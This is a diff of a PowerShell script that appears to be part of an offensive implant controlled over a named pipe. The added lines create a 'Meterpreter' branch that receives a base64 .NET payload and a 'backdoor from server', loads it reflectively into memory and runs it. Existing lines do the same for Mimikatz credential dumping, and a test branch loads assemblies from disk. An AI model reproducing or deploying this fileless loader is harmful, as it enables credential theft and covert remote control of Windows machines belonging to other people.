@@ -71,18 +71,45 @@ while($pipeClient.IsConnected){
         $script_action = $sr.ReadLine()
 
         if($script_action -eq "Mimikatz"){
-            $msg = $sr.ReadLine()
-            $assemblyByte = [System.Convert]::FromBase64String($msg)
+            $assemblyB64 = $sr.ReadLine()
+            $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
             $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
             Write-Host "Waiting for parameter..."
-            [String]$msg = $sr.ReadLine()
-            Write-Host "Parameter received : ", $msg
-            [String[]]$parameter = @(, $msg)
+            [String]$param = $sr.ReadLine() 
+            Write-Host "Parameter received : ", $param
+            [String[]]$parameter = @(, $param)
             $parameter_invoke = (, $parameter)
-            $assembly.EntryPoint.Invoke($null, $parameter_invoke)
+            $assembly.EntryPoint.Invoke($null, $null)
         }
         elseif($script_action -eq "Meterpreter"){
             Write-Host "Opening Meterpreter Session"
+            $assemblyB64 = $sr.ReadLine() # Receiving .NET payload
+            $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
+            $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
+            [String]$param = $sr.ReadLine() # Receiving backdoor from server
+            # [String]$filename = "C:\Users\adminPC\Documents\Admin\Yahudmeter\exploit.txt"
+            [String[]]$parameter = @(, $param)
+            $parameter_invoke = (, $parameter)
+            $assembly.EntryPoint.Invoke($null, $parameter_invoke)
+        }
+        elseif ($script_action -eq "Test PowerShell Assembly"){
+            Write-Host "For testing purpose"
+            $assemblyPath = $sr.ReadLine()
+            $filename = $sr.ReadLine()
+            [String]$param = [System.IO.File]::ReadAllText($filename)
+            [String[]]$parameter = @(, $param)
+
+            # Read the assembly from disk into a byte array
+            [Byte[]]$assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+            # Load the assembly
+            $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
+            # Find the Entrypoint or "Main" method
+            $entryPoint = $assembly.EntryPoint
+            # Get Parameters
+            $parameter_invoke = (, $parameter )
+
+            # Invoke the method with the specified parameters
+            $entryPoint.Invoke($null, $parameter_invoke) # Wrap the inner aray in another array litteral expression
         }
 
         $status = "0"
